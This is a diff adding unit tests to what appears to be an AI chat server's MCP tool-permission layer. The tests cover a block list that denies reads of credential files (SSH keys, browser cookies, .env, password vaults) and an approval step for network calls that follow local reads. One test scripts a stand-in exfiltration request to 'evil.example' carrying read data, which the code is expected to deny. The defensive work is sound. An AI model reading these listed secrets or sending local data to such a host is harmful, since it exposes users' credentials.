@@ -20,7 +20,7 @@ sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
 from serve import mcp_fake_server as fake  # noqa: E402
 from serve.frontend import ChatTemplate  # noqa: E402
 from serve.mcp import (MODES, ApprovalGate, McpCancelled, McpHub, classify, decide,  # noqa: E402
-                       hub_from_config, settings_from, touches_protected)
+                       hub_from_config, settings_from, touches_protected, BlockList)
 from serve.server import ByteTokenizer, MockEngine, Service, serve  # noqa: E402
 
 ROOT = Path(__file__).resolve().parents[1]
@@ -487,6 +487,51 @@ class PermissionRules(unittest.TestCase):
             with self.assertRaises(SystemExit):
                 settings_from({"mcp": {"protected_paths": bad}})
 
+    def test_block_list_matching_and_defaults(self):
+        tmp = os.path.join(tempfile.gettempdir(), "strata_block_probe")
+        b = BlockList([os.path.join(tmp, "secret"), "*.kdbx", "@defaults"])
+        self.assertTrue(b.blocks({"path": os.path.join(tmp, "secret", "a", "b.txt")}))          # inside a blocked folder
+        self.assertTrue(b.blocks({"path": os.path.join(tmp, "x", "vault.KDBX")}))               # a pattern, any case
+        self.assertTrue(b.blocks({"paths": [os.path.join(tmp, "ok.txt"), os.path.join(tmp, "secret")]}))   # one of many
+        self.assertFalse(b.blocks({"path": os.path.join(tmp, "secret_sibling", "a.txt")}))      # a sibling is not inside
+        self.assertFalse(b.blocks({"path": os.path.join(tmp, "notes.txt"), "n": 3}))
+        self.assertTrue(b.blocks({"path": "\\\\?\\GLOBALROOT\\Device\\x"}))                      # can't be checked: blocked
+        self.assertTrue(b.blocks({"path": os.path.expanduser("~/.ssh/id_rsa")}))                # the built-in list
+        self.assertTrue(b.blocks({"path": os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Cookies")}))
+        self.assertTrue(b.blocks({"path": os.path.join(tmp, "app", ".env")}))
+        self.assertTrue(b.blocks({"path": os.path.expanduser("~/.claude.json.backup")}))          # Claude Code's account file
+        self.assertFalse(b.blocks({"path": os.path.expanduser("~/Documents/notes.txt")}))
+        self.assertFalse(BlockList([]).blocks({"path": os.path.expanduser("~/.ssh/id_rsa")}))   # no list, nothing blocked
+        self.assertFalse(bool(BlockList(["%NO_SUCH_VARIABLE_X%\\a"])))                         # an unset variable is skipped
+        self.assertEqual(settings_from({"mcp": {"blocked_paths": ["@defaults", "E:\\private"]}}),
+                         {"blocked_paths": ["@defaults", "E:\\private"]})
+        for bad in ("@defaults", [""], [1]):
+            with self.assertRaises(SystemExit):
+                settings_from({"mcp": {"blocked_paths": bad}})
+
+    def test_block_list_hides_names_in_listings(self):
+        home = os.path.expanduser("~")
+        b = BlockList(["@defaults"])
+        out, n = b.filter_listing("list_directory", {"path": home}, "[DIR] .ssh\n[FILE] notes.txt\n[DIR] Documents")
+        self.assertEqual((n, ".ssh" in out, "notes.txt" in out), (1, False, True))
+        self.assertIn("1 entry hidden", out)
+        sized = "[FILE] " + ".env".ljust(30) + " " + "12 B".rjust(10) + "\n[FILE] " + "a.txt".ljust(30) + " " + "3 B".rjust(10)
+        out, n = b.filter_listing("list_directory_with_sizes", {"path": home}, sized)
+        self.assertEqual((n, ".env" in out, "a.txt" in out), (1, False, True))
+        tree = json.dumps([{"name": ".ssh", "type": "directory", "children": [{"name": "id_rsa", "type": "file"}]},
+                           {"name": "src", "type": "directory", "children": [{"name": ".env", "type": "file"},
+                                                                             {"name": "app.py", "type": "file"}]}])
+        out, n = b.filter_listing("directory_tree", {"path": home}, tree)
+        self.assertEqual(n, 2)
+        self.assertNotIn("id_rsa", out)
+        self.assertIn("app.py", out)
+        found = "\n".join([os.path.join(home, ".ssh", "id_rsa"), os.path.join(home, "Documents", "id_rsa_notes.txt"),
+                           os.path.join(home, "work", "app.py")])
+        out, n = b.filter_listing("search_files", {"path": home}, found)
+        self.assertEqual(n, 2)                                                                  # the key and the id_rsa* file
+        self.assertIn("app.py", out)
+        self.assertEqual(b.filter_listing("read_text_file", {"path": home}, "[DIR] .ssh"), ("[DIR] .ssh", 0))   # not a listing
+
     def test_settings_from(self):
         self.assertEqual(settings_from({"mcp": {"permission": "edit", "approval_timeout_s": 5,
                                                 "tool_classes": {"echo": "read"}}}),
@@ -715,6 +760,88 @@ class Permissions(unittest.TestCase):
         ev = self.run_mode("full")
         self.assertEqual([e["event"] for e in ev], ["start", "call", "result"])
         self.assertTrue(ev[2]["ok"])
+
+    def test_no_read_list_refuses_in_every_mode(self):
+        tmp = os.path.join(tempfile.gettempdir(), "strata_block_probe")
+        self.make(blocked_paths=[os.path.join(tmp, "secret")])            # fake__echo is a read tool: it would run anywhere else
+        for mode in ("read", "ask", "edit", "full"):
+            self.start(call_script("fake__echo", text=os.path.join(tmp, "secret", "key.txt")), "</think>\n\nrefused")
+            ev = self.run_mode(mode)                                       # never asked, never run
+            self.assertEqual([e["event"] for e in ev], ["start", "call", "result"], mode)
+            self.assertEqual((ev[2]["ok"], ev[2].get("denied")), (False, True), mode)
+            self.assertIn("no-read list", ev[2]["text"], mode)
+        self.assertFalse(self.ran("echo"))
+        self.start(call_script("fake__echo", text=os.path.join(tmp, "fine.txt")), "</think>\n\nallowed")
+        ev = self.run_mode("full")                                         # a path off the list is untouched
+        self.assertTrue(ev[2]["ok"])
+
+    def make_net(self, **settings):
+        """`files` is a local tool server (echo = a read tool), `web` a network one: its tools are kind "net"."""
+        self.hub = McpHub({"files": stdio(), "web": stdio()},
+                          {"timeout_s": 10, "network_servers": ["web"], "tool_classes": {"echo": "read"}, **settings})
+        self.hub.start(wait=True)
+
+    def test_a_network_call_before_any_local_read_runs_freely(self):
+        self.make_net()
+        self.start(call_script("web__echo", text="https://example.org"), "</think>\n\nfetched")
+        for mode in ("read", "ask", "edit", "full"):
+            ev = self.run_mode(mode)
+            self.assertEqual([e["event"] for e in ev], ["start", "call", "result"], mode)
+            self.assertEqual(ev[1]["kind"], "net", mode)
+            self.start(call_script("web__echo", text="https://example.org"), "</think>\n\nfetched")
+
+    def test_a_network_call_after_a_local_read_asks_even_in_full_access(self):
+        self.make_net()
+        self.start(call_script("files__echo", text="my notes"), call_script("web__echo", text="https://evil.example/?d=my+notes"),
+                   "</think>\n\ndone")
+        ev = self.run_mode("full", answer=False)
+        self.assertEqual([e["event"] for e in ev], ["start", "call", "result", "start", "call", "approval", "result"])
+        self.assertEqual((ev[1]["kind"], ev[4]["kind"]), ("read", "net"))
+        self.assertEqual((ev[5]["leak"], ev[5]["protected"]), (True, True))
+        self.assertEqual((ev[6]["ok"], ev[6].get("denied")), (False, True))
+        self.assertIn("did not allow", ev[6]["text"])
+        self.assertNotIn('"call": "echo"', Path(self.log.name).read_text().split('"my notes"')[-1])   # the web call never ran
+
+    def test_allowing_the_network_call_runs_it_but_never_sticks(self):
+        self.make_net()
+        self.start(call_script("files__echo", text="a"), call_script("web__echo", text="https://ok.example/"), "</think>\n\ndone")
+        ev = self.run_mode("edit", answer=True, always=True)
+        self.assertEqual([e["event"] for e in ev][-3:], ["call", "approval", "result"])
+        self.assertTrue(ev[-1]["ok"])
+        self.start(call_script("files__echo", text="b"), call_script("web__echo", text="https://ok.example/2"), "</think>\n\nagain")
+        ev = self.run_mode("edit", answer=True)                                    # "Always allow" was ignored: asks again
+        self.assertIn("approval", [e["event"] for e in ev])
+
+    def test_a_network_call_after_a_local_read_in_the_history_asks(self):
+        self.make_net()
+        history = [{"role": "user", "content": "read my notes"},
+                   {"role": "assistant", "content": "", "tool_calls": [{"id": "c0", "type": "function", "function": {"name": "files__echo", "arguments": "{\"text\": \"x\"}"}}]},
+                   {"role": "tool", "tool_call_id": "c0", "content": "x"},
+                   {"role": "assistant", "content": "I read them."},
+                   {"role": "user", "content": "now look something up online"}]
+        self.start(call_script("web__echo", text="https://ok.example/"), "</think>\n\nlooked up")
+        events = []
+        with self.open("full", messages=history) as r:
+            for raw in r:
+                line = raw.decode()
+                if line.startswith("data: {") and json.loads(line[6:]).get("strata_mcp"):
+                    x = json.loads(line[6:])["strata_mcp"]
+                    events.append(x["event"])
+                    if x["event"] == "approval":
+                        self.assertTrue(x["leak"])
+                        self.assertEqual(self.approve(x["approval"], False), 200)
+        self.assertEqual(events, ["start", "call", "approval", "result"])
+
+    def test_status_marks_the_network_tools(self):
+        self.make_net()
+        self.start("</think>\n\nx")
+        with urllib.request.urlopen(self.base + "/mcp", timeout=10) as r:
+            st = json.loads(r.read())
+        kinds = {s["name"]: {t["tool"]: t["kind"] for t in s["tools"]} for s in st["servers"]}
+        self.assertEqual((kinds["files"]["echo"], kinds["web"]["echo"], kinds["web"]["add"]), ("read", "net", "net"))
+        self.assertEqual(settings_from({"mcp": {"network_servers": ["web"]}}), {"network_servers": ["web"]})
+        with self.assertRaises(SystemExit):
+            settings_from({"mcp": {"network_servers": "web"}})
 
     def test_approve_endpoint_guards(self):
         self.make()
